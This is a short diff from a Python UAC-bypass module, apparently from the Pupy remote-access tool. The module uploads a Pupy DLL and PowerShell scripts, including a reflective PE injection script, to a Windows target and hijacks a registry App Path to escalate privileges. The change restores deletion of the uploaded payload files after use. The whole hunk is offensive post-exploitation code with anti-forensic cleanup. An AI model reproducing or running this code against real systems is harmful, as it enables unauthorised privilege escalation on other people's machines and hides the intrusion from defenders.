@@ -50,8 +50,7 @@ class bypassuac():
         self.module.info('Uploading temporary files')
         self.uploadPupyDLL(force_x86_dll=force_x86_dll)
         self.uploadPowershellScripts()
-        #files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
-        files_to_delete=[]
+        files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
         self.module.info('Altering the registry')
         self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_appPath(self.mainPowershellScriptRemotePath, files_to_delete)
         
